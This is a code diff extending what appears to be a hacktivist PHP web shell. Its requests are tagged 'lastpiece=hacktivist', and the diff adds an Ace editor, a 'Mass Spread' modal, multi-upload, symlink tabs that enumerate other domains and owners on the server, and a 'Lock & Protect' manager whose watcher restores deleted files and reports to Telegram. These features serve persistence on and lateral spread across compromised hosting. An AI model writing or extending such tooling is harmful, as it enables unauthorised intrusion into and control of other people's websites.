+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="display:inline;vertical-align:middle;margin-right:5px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                Lock &amp; Protect
             </button>
+        </div>
+    </div>
+</div>
+
+<!-- Lock Manager Modal -->
+<div class="modal-overlay hidden" id="lockManagerModal">
+    <div class="modal" style="max-width:700px;width:97vw;">
+        <div class="modal-header" style="border-bottom-color:rgba(245,158,11,0.4);background:rgba(245,158,11,0.05);">
+            <span class="modal-title" style="color:#f59e0b;display:flex;align-items:center;gap:8px;">
+                <span style="display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;background:rgba(245,158,11,0.15);border-radius:6px;border:1px solid rgba(245,158,11,0.3);">
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                </span>
+                Lock Manager
+                <span id="lockMgrWatcherBadge" style="display:none;font-size:9px;font-weight:700;padding:2px 8px;border-radius:4px;background:rgba(74,222,128,0.15);border:1px solid rgba(74,222,128,0.4);color:#4ade80;animation:procPulse 2s infinite;">
+                    WATCHER AKTIF
+                </span>
+            </span>
+            <button class="modal-close" onclick="hideModal2('lockManagerModal');if(_lockMgrPollTimer){clearInterval(_lockMgrPollTimer);_lockMgrPollTimer=null;}"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+        </div>
+        <div class="modal-body" style="padding:14px;min-height:120px;">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;flex-wrap:wrap;gap:8px;">
+                <div style="display:flex;align-items:center;gap:6px;">
+                    <span id="lockMgrDot" style="display:inline-block;width:8px;height:8px;border-radius:50%;background:#6b7280;"></span>
+                    <span id="lockMgrStats" style="color:var(--text-muted);font-size:11px;">Loading...</span>
+                </div>
+                <div style="display:flex;gap:6px;align-items:center;">
+                    <button class="btn btn-sm" style="border-color:#63b3ed;color:#63b3ed;font-size:10px;padding:3px 8px;" onclick="loadLockedFiles()">
+                        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:2px;"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-3.58"/></svg>Refresh
+                    </button>
+                    <button class="btn btn-sm" style="border-color:#f59e0b;color:#f59e0b;font-size:10px;padding:3px 8px;" onclick="runTickNow()" title="Paksa restore file yang missing sekarang">
+                        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:2px;"><polygon points="5 3 19 12 5 21 5 3"/></svg>Restore Now
+                    </button>
+                    <button class="btn btn-sm" style="border-color:#f85149;color:#f85149;font-size:10px;padding:3px 8px;" onclick="doUnlockAll()">Unlock All</button>
+                </div>
+            </div>
+            <!-- Telegram Settings Collapsible -->
+            <div style="margin-bottom:12px;">
+                <button onclick="toggleTgPanel()" style="width:100%;background:rgba(41,182,246,0.07);border:1px solid rgba(41,182,246,0.2);border-radius:7px;padding:8px 12px;cursor:pointer;display:flex;align-items:center;justify-content:space-between;color:#29b6f6;">
+                    <span style="display:flex;align-items:center;gap:7px;font-size:11px;font-weight:600;">
+                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#29b6f6" stroke-width="2"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+                        Notifikasi Telegram
+                        <span id="tgStatusBadge" style="display:none;font-size:9px;font-weight:700;padding:1px 7px;border-radius:4px;"></span>
+                    </span>
+                    <svg id="tgPanelArrow" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#29b6f6" stroke-width="2" style="transition:transform 0.2s;"><polyline points="6 9 12 15 18 9"/></svg>
+                </button>
+                <div id="tgSettingsPanel" style="display:none;background:rgba(41,182,246,0.04);border:1px solid rgba(41,182,246,0.15);border-top:none;border-radius:0 0 7px 7px;padding:12px;">
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px;">
+                        <div>
+                            <label style="font-size:10px;color:var(--text-muted);display:block;margin-bottom:3px;">Bot Token</label>
+                            <input type="password" id="tgBotToken" class="form-input" placeholder="1234567890:AAFxxx..." style="font-family:monospace;font-size:11px;padding:6px 8px;" autocomplete="off">
+                        </div>
+                        <div>
+                            <label style="font-size:10px;color:var(--text-muted);display:block;margin-bottom:3px;">Chat ID / Username</label>
+                            <input type="text" id="tgChatId" class="form-input" placeholder="-100xxxxxxxx atau @username" style="font-family:monospace;font-size:11px;padding:6px 8px;" autocomplete="off">
+                        </div>
+                    </div>
+                    <div style="background:rgba(41,182,246,0.07);border:1px solid rgba(41,182,246,0.15);border-radius:5px;padding:7px 10px;font-size:10px;color:#29b6f6;margin-bottom:10px;line-height:1.5;">
+                        Dapatkan token dari <a href="https://t.me/BotFather" target="_blank" style="color:#29b6f6;">@BotFather</a> lalu kirim pesan ke bot kamu agar chat_id aktif.
+                        Notifikasi dikirim saat file hilang (alert), berhasil restore (sukses), atau gagal restore (error).
+                    </div>
+                    <div id="tgSaveStatus" style="display:none;margin-bottom:8px;font-size:10px;padding:5px 10px;border-radius:5px;"></div>
+                    <div style="display:flex;gap:6px;justify-content:flex-end;">
+                        <button onclick="saveTgSettings()" style="padding:5px 14px;background:#29b6f6;border:1px solid rgba(41,182,246,0.6);border-radius:5px;color:#000;font-size:11px;font-weight:700;cursor:pointer;display:inline-flex;align-items:center;gap:4px;">
+                            <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+                            Simpan &amp; Test
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Diagnostic bar — shown when shell watcher dead/disabled -->
+            <div id="lockMgrDiag" style="display:none;margin-bottom:10px;padding:8px 10px;background:rgba(248,81,73,0.08);border:1px solid rgba(248,81,73,0.25);border-radius:5px;font-size:10px;color:#f87171;line-height:1.5;">
+            </div>
+            <div id="lockManagerLoading" style="text-align:center;color:var(--text-muted);font-size:11px;padding:30px;">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" style="animation:spin 1s linear infinite;display:block;margin:0 auto 8px;"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>
+                Loading...
+            </div>
+            <table id="lockManagerTable" style="display:none;width:100%;border-collapse:collapse;font-size:11px;">
+                <thead>
+                <tr style="background:rgba(245,158,11,0.08);border-bottom:1px solid rgba(245,158,11,0.2);">
+                    <th style="padding:7px 8px;text-align:left;color:#f59e0b;font-weight:600;">Path</th>
+                    <th style="padding:7px 8px;text-align:center;color:var(--text-muted);font-weight:600;">Lock</th>
+                    <th style="padding:7px 8px;text-align:center;color:var(--text-muted);font-weight:600;">Cur</th>
+                    <th style="padding:7px 8px;text-align:center;color:#4ade80;font-weight:600;">Backup</th>
+                    <th style="padding:7px 8px;text-align:center;color:var(--text-muted);font-weight:600;">Status</th>
+                    <th style="padding:7px 8px;text-align:center;color:#f85149;font-weight:600;">Action</th>
+                </tr>
+                </thead>
+                <tbody id="lockManagerBody"></tbody>
+            </table>
+            <p id="lockManagerEmpty" style="display:none;text-align:center;color:var(--text-muted);font-size:11px;padding:30px;">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="display:block;margin:0 auto 8px;opacity:0.3;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                Tidak ada file yang dikunci.
+            </p>
         </div>
     </div>
 </div>
@@ -3257,7 +4475,8 @@ body {
         </div>
         <div class="modal-body" style="padding: 12px;">
             <div id="editLoading" style="text-align:center;padding:40px;color:var(--text-muted);">Loading file content...</div>
-            <textarea id="editFileContent" class="editor-area" style="display:none;width:100%;height:55vh;font-family:monospace;font-size:12px;background:var(--bg-input);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:10px;resize:vertical;tab-size:4;"></textarea>
+            <div id="editCmWrap" style="display:none;"></div>
+            <textarea id="editFileContent" style="display:none;"></textarea>
         </div>
         <div class="modal-footer" style="justify-content: flex-end; gap: 8px;">
             <button type="button" class="btn btn-secondary" onclick="hideEditModal()">Cancel</button>
@@ -3374,12 +4593,29 @@ body {
 </div>
 
 <!-- Mass Spread Modal -->
-<div class="modal-overlay hidden" id="spreadModal">
-    <div class="modal" style="max-width: 550px;">
+<div class="modal-overlay <?php echo isset($_POST['mass_spread']) ? '' : 'hidden'; ?>" id="spreadModal">
+    <div class="modal" style="max-width: 600px; max-height: 90vh;">
         <div class="modal-header">
             <span class="modal-title">Mass Spread (Auto-Match)</span>
             <button class="modal-close" onclick="hideModal('spread')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
         </div>
+        <?php if (isset($_POST['mass_spread']) && !empty($responseMessage)): ?>
+        <div class="modal-body" style="overflow-y:auto;max-height:calc(90vh - 120px);">
+            <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px;">
+                <div style="width:36px;height:36px;background:rgba(63,185,80,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#3fb950" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
+                </div>
+                <div style="font-size:13px;font-weight:600;color:#3fb950;">Spread Complete</div>
+            </div>
+            <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px;max-height:420px;overflow-y:auto;">
+                <?php echo $responseMessage; ?>
+            </div>
+        </div>
+        <div class="modal-footer" style="justify-content:center;">
+            <button class="btn btn-secondary" onclick="hideModal('spread')">Close</button>
+            <button class="btn btn-primary" onclick="hideModal('spread');showModal('spread')">Spread Again</button>
+        </div>
+        <?php else: ?>
         <form method="POST">
             <div class="modal-body">
                 <div style="background: rgba(0, 212, 255, 0.08); border: 1px solid rgba(0, 212, 255, 0.2); border-radius: 6px; padding: 12px; margin-bottom: 14px;">
@@ -3399,16 +4635,34 @@ body {
                 <button type="submit" name="mass_spread" class="btn btn-primary">Spread All</button>
             </div>
         </form>
+        <?php endif; ?>
     </div>
 </div>
 
 <!-- Multi Upload Modal -->
-<div class="modal-overlay hidden" id="multiuploadModal">
-    <div class="modal" style="max-width: 550px;">
+<div class="modal-overlay <?php echo isset($_POST['multi_upload']) ? '' : 'hidden'; ?>" id="multiuploadModal">
+    <div class="modal" style="max-width: 600px; max-height: 90vh;">
         <div class="modal-header">
             <span class="modal-title">Multi Upload</span>
             <button class="modal-close" onclick="hideModal('multiupload')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
         </div>
+        <?php if (isset($_POST['multi_upload']) && !empty($responseMessage)): ?>
+        <div class="modal-body" style="overflow-y:auto;max-height:calc(90vh - 120px);">
+            <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px;">
+                <div style="width:36px;height:36px;background:rgba(63,185,80,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#3fb950" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
+                </div>
+                <div style="font-size:13px;font-weight:600;color:#3fb950;">Upload Complete</div>
+            </div>
+            <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px;max-height:420px;overflow-y:auto;">
+                <?php echo $responseMessage; ?>
+            </div>
+        </div>
+        <div class="modal-footer" style="justify-content:center;">
+            <button class="btn btn-secondary" onclick="hideModal('multiupload')">Close</button>
+            <button class="btn btn-primary" onclick="location.reload()">Refresh</button>
+        </div>
+        <?php else: ?>
         <form method="POST" enctype="multipart/form-data">
             <div class="modal-body">
                 <div id="uploadersContainer">
@@ -3428,6 +4682,7 @@ body {
                 <button type="submit" name="multi_upload" class="btn btn-primary">Upload All</button>
             </div>
         </form>
+        <?php endif; ?>
     </div>
 </div>
 
@@ -3741,6 +4996,7 @@ body {
 </div>
 <style>
 @keyframes procPulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.4} }
 .proc-row:hover { background: rgba(236,72,153,0.06) !important; }
 .proc-hidden { border-left: 3px solid #f85149 !important; background: rgba(248,81,73,0.06) !important; }
 .proc-recent { border-left: 3px solid #3fb950 !important; background: rgba(63,185,80,0.06) !important; }
@@ -3986,6 +5242,14 @@ body {
 @keyframes msgFadeIn { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
 </style>
 
+<!-- Ace Editor -->
+<style>
+#editCmWrap { height:55vh; border-radius:6px; overflow:hidden; border:1px solid var(--border); font-size:12px; }
+#editCmWrap .ace_editor { height:100%; font-family:'SF Mono','Cascadia Code','Consolas',monospace !important; font-size:12px !important; }
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.9/ace.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.9/ext-language_tools.min.js"></script>
+
 <!-- Cursor Resize Script -->
 <script>
 (function(){
@@ -4128,7 +5392,13 @@ var _pageToastFired = false;
         if (successDiv) {
             var txt = successDiv.textContent.trim();
             successDiv.style.display = 'none';
-            if (txt) { _pageToastFired = true; setTimeout(function() { showToast(txt, 'success', 5000, 'applepay'); }, 200); }
+            if (txt) {
+                _pageToastFired = true;
+                var toastTxt = txt;
+                if (txt.indexOf('File Uploaded') !== -1 || txt.indexOf('Uploaded') !== -1) toastTxt = 'Success Upload';
+                else if (txt.indexOf('Mass Spread') !== -1 || txt.indexOf('spread') !== -1) toastTxt = 'Mass Spread Complete';
+                setTimeout(function() { showToast(toastTxt, 'success', 5000, 'applepay'); }, 200);
+            }
         }
     } else {
         var sd = document.querySelector('.msg-success'); if (sd) sd.style.display = 'none';
@@ -4226,47 +5496,106 @@ function showDeleteConfirm(path, name) {
 }
 function hideDeleteConfirm() { document.getElementById('deleteConfirmModal').classList.add('hidden'); }
 
-// === AJAX helper for file operations ===
+// === AJAX helper for file operations (fetch + FormData — handles large files) ===
 function fileActionRequest(data, callback) {
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', window.location.pathname, true);
-    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-            try { var r = JSON.parse(xhr.responseText); callback(r); }
-            catch(e) { callback({err: 'Invalid response'}); }
-        }
-    };
-    var params = [];
-    for (var key in data) { params.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key])); }
-    xhr.send(params.join('&'));
-}
-
-// === EDIT FILE MODAL ===
-function showEditModal(path) {
-    document.getElementById('editFilePath').value = path;
-    document.getElementById('editFileName').textContent = path.split('/').pop();
-    document.getElementById('editLoading').style.display = '';
-    document.getElementById('editFileContent').style.display = 'none';
-    document.getElementById('editFileContent').value = '';
-    document.getElementById('editSaveBtn').disabled = true;
-    document.getElementById('editFileModal').classList.remove('hidden');
-    fileActionRequest({file_action: 'get_content', file_path: path}, function(r) {
-        document.getElementById('editLoading').style.display = 'none';
-        if (r.err) {
-            document.getElementById('editFileContent').style.display = '';
-            document.getElementById('editFileContent').value = 'Error: ' + r.err;
-        } else {
-            document.getElementById('editFileContent').style.display = '';
-            document.getElementById('editFileContent').value = r.content;
-            document.getElementById('editSaveBtn').disabled = false;
-        }
+    var form = new FormData();
+    for (var key in data) { if (Object.prototype.hasOwnProperty.call(data, key)) form.append(key, data[key]); }
+    fetch(window.location.pathname + '?lastpiece=hacktivist', {
+        method: 'POST', body: form
+    }).then(function(r) {
+        return r.text();
+    }).then(function(txt) {
+        try { callback(JSON.parse(txt)); }
+        catch(e) { callback({err: 'Invalid response: ' + txt.substring(0, 120)}); }
+    }).catch(function(e) {
+        callback({err: e.message || 'Network error'});
     });
 }
-function hideEditModal() { document.getElementById('editFileModal').classList.add('hidden'); }
+
+// === EDIT FILE MODAL — Ace Editor ===
+var _aceEditor = null;
+
+function _aceModeForFile(name) {
+    var ext = (name.split('.').pop() || '').toLowerCase();
+    var map = {
+        'php':'ace/mode/php','html':'ace/mode/html','htm':'ace/mode/html',
+        'js':'ace/mode/javascript','jsx':'ace/mode/javascript',
+        'ts':'ace/mode/typescript','tsx':'ace/mode/typescript',
+        'json':'ace/mode/json','css':'ace/mode/css','scss':'ace/mode/scss',
+        'less':'ace/mode/less','py':'ace/mode/python','sh':'ace/mode/sh',
+        'bash':'ace/mode/sh','sql':'ace/mode/sql','xml':'ace/mode/xml',
+        'svg':'ace/mode/xml','yaml':'ace/mode/yaml','yml':'ace/mode/yaml',
+        'md':'ace/mode/markdown','txt':'ace/mode/text','ini':'ace/mode/ini',
+        'conf':'ace/mode/apache_conf','htaccess':'ace/mode/apache_conf',
+        'java':'ace/mode/java','c':'ace/mode/c_cpp','cpp':'ace/mode/c_cpp',
+        'rb':'ace/mode/ruby','go':'ace/mode/golang','rs':'ace/mode/rust'
+    };
+    return map[ext] || 'ace/mode/text';
+}
+
+function _aceGetOrCreate() {
+    if (_aceEditor) return _aceEditor;
+    var wrap = document.getElementById('editCmWrap');
+    wrap.innerHTML = '<div id="aceEditorInner" style="position:absolute;top:0;right:0;bottom:0;left:0;"></div>';
+    wrap.style.position = 'relative';
+    _aceEditor = ace.edit('aceEditorInner');
+    _aceEditor.setTheme('ace/theme/monokai');
+    _aceEditor.setOptions({
+        fontSize: '12px',
+        fontFamily: "'SF Mono','Cascadia Code','Consolas',monospace",
+        showLineNumbers: true,
+        showGutter: true,
+        highlightActiveLine: true,
+        enableBasicAutocompletion: true,
+        enableSnippets: true,
+        enableLiveAutocompletion: false,
+        tabSize: 4,
+        useSoftTabs: true,
+        wrap: false,
+        showPrintMargin: false
+    });
+    return _aceEditor;
+}
+
+function showEditModal(path) {
+    var fileName = path.split('/').pop();
+    document.getElementById('editFilePath').value = path;
+    document.getElementById('editFileName').textContent = fileName;
+    document.getElementById('editLoading').style.display = '';
+    document.getElementById('editCmWrap').style.display = 'none';
+    document.getElementById('editSaveBtn').disabled = true;
+    document.getElementById('editFileModal').classList.remove('hidden');
+
+    fileActionRequest({file_action: 'get_content', file_path: path}, function(r) {
+        var decoded = '', hasErr = false;
+        if (r.err) {
+            decoded = 'Error: ' + r.err; hasErr = true;
+        } else {
+            decoded = r.content || '';
+            if (r.encoded) { try { decoded = atob(decoded); } catch(e) {} }
+        }
+        document.getElementById('editFileContent').value = decoded;
+        document.getElementById('editLoading').style.display = 'none';
+        document.getElementById('editCmWrap').style.display = '';
+
+        var ed = _aceGetOrCreate();
+        ed.session.setMode(_aceModeForFile(fileName));
+        ed.setReadOnly(hasErr);
+        ed.setValue(decoded, -1); // -1 = cursor at start
+        ed.session.getUndoManager().reset();
+        ed.resize();
+        setTimeout(function() { ed.focus(); }, 30);
+        if (!hasErr) document.getElementById('editSaveBtn').disabled = false;
+    });
+}
+
+function hideEditModal() {
+    document.getElementById('editFileModal').classList.add('hidden');
+    if (_aceEditor) { _aceEditor.setValue(''); _aceEditor.session.getUndoManager().reset(); }
+}
 function saveEditFile() {
     var path = document.getElementById('editFilePath').value;
-    var content = document.getElementById('editFileContent').value;
+    var content = _aceEditor ? _aceEditor.getValue() : document.getElementById('editFileContent').value;
     var btn = document.getElementById('editSaveBtn');
     btn.disabled = true;
     btn.textContent = 'Saving...';
@@ -4344,12 +5673,87 @@ function doChmod() {
 function hideModal2(id) { document.getElementById(id).classList.add('hidden'); }
 
 // === SYMLINK ===
+function symSwitchTab(tab) {
+    var tabs = ['php','perl','python','file'];
+    tabs.forEach(function(t) {
+        var btn  = document.getElementById('symTab_' + t);
+        var pane = document.getElementById('symPane_' + t);
+        if (t === tab) {
+            btn.style.background = 'rgba(167,139,250,0.18)';
+            btn.style.color = '#a78bfa';
+            btn.style.borderBottomColor = '#a78bfa';
+            btn.style.fontWeight = '700';
+            pane.style.display = '';
+        } else {
+            btn.style.background = 'transparent';
+            btn.style.color = 'var(--text-muted)';
+            btn.style.borderBottomColor = 'transparent';
+            btn.style.fontWeight = '400';
+            pane.style.display = 'none';
+        }
+    });
+}
+
+function doSymlinkAction(mode) {
+    var btn = event ? event.target : null;
+    if (btn) { btn.disabled = true; btn.textContent = 'Running...'; }
+    var body = 'file_action=create_symlink&sym_mode=' + mode + '&target_dir=' + encodeURIComponent(window._currentDir || '');
+    fetch(window.location.pathname + '?lastpiece=hacktivist', {
+        method: 'POST',
+        headers: {'Content-Type':'application/x-www-form-urlencoded'},
+        body: body
+    })
+    .then(function(r){ return r.json(); })
+    .then(function(data) {
+        if (btn) { btn.disabled = false; btn.textContent = btn.textContent.includes('Perl') ? 'Run Symlink Perl' : btn.textContent.includes('Python') ? 'Run Symlink Python' : 'Run Symlink PHP'; }
+        if (mode === 'symphp') {
+            var res = document.getElementById('symResult_php');
+            res.style.display = '';
+            var urlEl = document.getElementById('symRootUrl');
+            if (data.root_url) urlEl.innerHTML = 'Root URL: <a href="' + data.root_url + '" target="_blank" style="color:#a78bfa;">' + data.root_url + '</a>';
+            var body = document.getElementById('symDomainBody');
+            var nodom = document.getElementById('symNoDomains');
+            body.innerHTML = '';
+            if (data.rows && data.rows.length > 0) {
+                nodom.style.display = 'none';
+                data.rows.forEach(function(row, i) {
+                    var tr = document.createElement('tr');
+                    tr.style.borderBottom = '1px solid rgba(255,255,255,0.04)';
+                    tr.innerHTML = '<td style="padding:5px 8px;color:#facc15;">' + (i+1) + '</td>'
+                        + '<td style="padding:5px 8px;"><a href="http://' + row.domain + '" target="_blank" style="color:#22d3ee;">' + row.domain + '</a></td>'
+                        + '<td style="padding:5px 8px;color:#fff;">' + row.owner + '</td>'
+                        + '<td style="padding:5px 8px;text-align:center;"><a href="' + row.url + '" target="_blank" style="color:#f87171;font-weight:600;">Symlink</a></td>';
+                    body.appendChild(tr);
+                });
+            } else {
+                nodom.style.display = '';
+            }
+            if (!data.ok) { showToast('symlink() disabled — root may not have been created', 'error'); }
+        } else if (mode === 'symperl' || mode === 'sympy') {
+            var paneKey = mode === 'symperl' ? 'perl' : 'python';
+            var pre = document.getElementById('symResult_' + paneKey);
+            pre.style.display = '';
+            pre.textContent = (data.output || 'No output') + (data.base_url ? '\n\nBase URL: ' + data.base_url : '');
+            if (data.ok) showToast('Symlink script executed', 'success');
+            else showToast(data.err || 'Error', 'error');
+        }
+    })
+    .catch(function(e) {
+        if (btn) { btn.disabled = false; }
+        showToast('Request failed: ' + e.message, 'error');
+    });
+}
+
 function showSymlinkModal() {
     document.getElementById('symlinkTarget').value = '';
     document.getElementById('symlinkName').value = '';
-    updateSymlinkPreview();
+    document.getElementById('symlinkPreview').textContent = 'symlink: link_name -> /target/path';
+    document.getElementById('symResult_php').style.display  = 'none';
+    document.getElementById('symResult_perl').style.display = 'none';
+    document.getElementById('symResult_python').style.display = 'none';
+    document.getElementById('symResult_file').style.display = 'none';
+    symSwitchTab('php');
     document.getElementById('symlinkModal').classList.remove('hidden');
-    setTimeout(function() { document.getElementById('symlinkTarget').focus(); }, 100);
 }
 function updateSymlinkPreview() {
     var t = document.getElementById('symlinkTarget').value.trim() || '/target/path';
@@ -4358,20 +5762,25 @@ function updateSymlinkPreview() {
 }
 function doCreateSymlink() {
     var target = document.getElementById('symlinkTarget').value.trim();
-    var name = document.getElementById('symlinkName').value.trim();
+    var name   = document.getElementById('symlinkName').value.trim();
     if (!target) { showToast('Please enter a target path', 'warning'); return; }
-    if (!name) { showToast('Please enter a link name', 'warning'); return; }
+    if (!name)   { showToast('Please enter a link name',   'warning'); return; }
     fileActionRequest({
-        file_action: 'create_symlink',
-        symlink_target: target,
-        symlink_name: name,
-        target_dir: '<?php echo addslashes($currentDirectory); ?>'
+        file_action:     'create_symlink',
+        sym_mode:        'file',
+        symlink_target:  target,
+        symlink_name:    name,
+        target_dir:      '<?php echo addslashes($currentDirectory); ?>'
     }, function(r) {
+        var resEl = document.getElementById('symResult_file');
+        resEl.style.display = '';
         if (r.ok) {
+            var link = r.url ? ' &nbsp;<a href="' + r.url + '" target="_blank" style="color:#a78bfa;font-size:10px;">Open &rarr;</a>' : '';
+            resEl.innerHTML = '<div style="color:#4ade80;font-size:11px;font-family:monospace;padding:6px 8px;background:rgba(74,222,128,0.07);border-radius:4px;">[OK] ' + (r.msg || 'Symlink created') + link + '</div>';
             showToast(r.msg || 'Symlink created', 'success', 4000, 'applepay');
-            hideModal2('symlinkModal');
-            setTimeout(function() { location.reload(); }, 800);
+            setTimeout(function() { location.reload(); }, 1500);
         } else {
+            resEl.innerHTML = '<div style="color:#f87171;font-size:11px;font-family:monospace;padding:6px 8px;background:rgba(248,113,113,0.07);border-radius:4px;">[ERR] ' + (r.err || 'Unknown error') + '</div>';
             showToast('Failed: ' + (r.err || 'Unknown error'), 'error');
             playFailSound();
         }
@@ -4716,14 +6125,27 @@ function bulkAction(type) {
         document.getElementById('zipFileName').value = 'archive_' + Date.now() + '.zip';
         document.getElementById('zipNameModal').classList.remove('hidden');
     } else if (type === 'delete') {
-        if (!confirm('Delete ' + paths.length + ' selected items? This cannot be undone!')) return;
-        fileActionRequest({file_action: 'mass_delete', paths: JSON.stringify(paths)}, function(r) {
-            if (r.ok) {
-                showToast('Deleted <b>' + r.deleted + '</b> items' + (r.failed > 0 ? ', <b>' + r.failed + '</b> failed' : ''), r.failed > 0 ? 'warning' : 'success', 4000, 'applepay');
-                clearSelection();
-                setTimeout(function() { location.reload(); }, 800);
-            } else {
-                showToast('Delete failed: ' + (r.err || 'Unknown'), 'error'); playFailSound();
+        var pathsCopy = paths.slice();
+        var icon = '<polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/><path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/>';
+        showConfirm({
+            title:  'Hapus ' + pathsCopy.length + ' Item',
+            msg:    'Yakin ingin menghapus <strong>' + pathsCopy.length + '</strong> item yang dipilih?',
+            detail: pathsCopy.slice(0, 5).map(function(p){ return p.split('/').pop(); }).join('<br>') + (pathsCopy.length > 5 ? '<br><span style="opacity:0.6;">+ ' + (pathsCopy.length - 5) + ' lainnya</span>' : ''),
+            warn:   'Tindakan ini tidak dapat dibatalkan. Semua item akan dihapus permanen.',
+            color:  '#f85149', colorAlpha: 'rgba(248,81,73,',
+            icon:   icon, okIcon: icon,
+            okLabel:   'Hapus ' + pathsCopy.length + ' Item',
+            cancelLabel: 'Batal',
+            onOk: function() {
+                fileActionRequest({file_action: 'mass_delete', paths: JSON.stringify(pathsCopy)}, function(r) {
+                    if (r.ok) {
+                        showToast('Deleted <b>' + r.deleted + '</b> items' + (r.failed > 0 ? ', <b>' + r.failed + '</b> failed' : ''), r.failed > 0 ? 'warning' : 'success', 4000, 'applepay');
+                        clearSelection();
+                        setTimeout(function() { location.reload(); }, 800);
+                    } else {
+                        showToast('Delete failed: ' + (r.err || 'Unknown'), 'error'); playFailSound();
+                    }
+                });
             }
         });
     }
@@ -4801,42 +6223,428 @@ function doExtractZip() {
 }
 
 // === MASS DELETE RECURSIVE ===
+// === LOCKFILE JS ===
+function showLockModal(path, name) {
+    document.getElementById('lockModalPath').textContent = path;
+    document.getElementById('lockModalPerm').value = '0444';
+    document.getElementById('lockFileModal').classList.remove('hidden');
+}
+
+function doLockFile() {
+    var path = document.getElementById('lockModalPath').textContent.trim();
+    var perm = document.getElementById('lockModalPerm').value.trim();
+    if (!path) return;
+    if (!/^0?[0-7]{3,4}$/.test(perm)) { showToast('Permission tidak valid (contoh: 0444)', 'warning'); return; }
+    fetch(window.location.pathname + '?lastpiece=hacktivist', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'lock_action=lock&lock_path=' + encodeURIComponent(path) + '&lock_perm=' + encodeURIComponent(perm)
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+        if (d.ok) {
+            var backupInfo = d.has_backup ? ' | Backup OK' : ' | No backup (dirs excluded or upload failed)';
+            showToast('Locked: ' + path.split('/').pop() + ' [' + perm + ']' + backupInfo, 'success', 5000, 'applepay');
+            hideModal2('lockFileModal');
+        } else {
+            showToast('Gagal: ' + (d.err || 'Unknown error'), 'error');
+        }
+    }).catch(function(e) { showToast('Error: ' + e.message, 'error'); });
+}
+
+// ── UNIVERSAL CONFIRM DIALOG ──────────────────────────────────────────────
+var _uConfirmCallback = null;
+function showConfirm(opts) {
+    // opts: { title, msg, sub, detail, warn, color, icon, okLabel, cancelLabel, onOk }
+    var color      = opts.color     || '#f85149';
+    var colorAlpha = opts.colorAlpha|| 'rgba(248,81,73,';
+    var icon       = opts.icon      || '<polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/>';
+    _uConfirmCallback = opts.onOk || null;
+
+    // Header
+    var hdr = document.getElementById('uConfirmHeader');
+    hdr.style.borderBottomColor = colorAlpha + '0.25)';
